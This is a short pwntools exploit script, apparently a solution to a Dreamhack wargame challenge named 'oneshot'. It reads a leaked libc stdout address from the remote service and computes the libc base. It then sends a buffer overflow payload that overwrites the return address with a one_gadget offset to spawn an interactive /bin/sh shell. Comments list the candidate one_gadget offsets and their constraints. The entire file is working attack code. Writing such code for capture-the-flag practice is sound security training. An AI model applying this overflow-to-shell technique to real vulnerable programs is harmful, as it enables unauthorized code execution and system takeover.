from pwn import *

context.update(log_level='debug')

#p = process('oneshot')
p = remote('host1.dreamhack.games', 17982)
libc = ELF('libc.so.6')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_stdout = libc.symbols['_IO_2_1_stdout_']
log.info('offset_stdout: ' + hex(offset_stdout))
addr_libc_stdout = int(p.recvline().split(' ')[1], 16)
addr_libc_base = addr_libc_stdout - offset_stdout

'''remote
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

'''local
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
log.info('addr_libc_stdout: ' + hex(addr_libc_stdout))
log.info('addr_libc_base: ' + hex(addr_libc_base))
offset_oneshot = 0xf1147
addr_oneshot = addr_libc_base + offset_oneshot
p.sendline('a'*0x18 + p64(0) + 'b'*8 + p64(addr_oneshot))

p.interactive()
